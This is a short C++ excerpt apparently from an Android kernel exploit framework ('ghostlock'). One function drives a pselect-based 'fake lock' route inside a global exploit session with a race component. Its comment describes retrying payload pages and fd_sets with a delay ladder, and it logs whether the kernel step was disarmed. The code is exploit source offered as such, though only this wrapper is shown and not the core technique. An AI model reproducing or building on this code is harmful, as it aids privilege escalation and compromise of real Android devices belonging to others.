    route::RouteStatus do_pselect_fake_lock_route(const memory::WriteRequest *request) {
        /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
     * four times, rebuilding the payload page and fd_sets per attempt and
     * advancing the consumer handshake. The delay ladder and the attempt
     * count stay native-side until a Select device can validate a
     * profile-schema extension; the profile still owns the timeout. */
        select_stack::SelectStackRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            session::g_exploit_session.profile.select_stack_layout(),
            standard_io_backup);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
            pr_error("pselect consumer still inflight; leaking route fds\n");
        }

        pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__


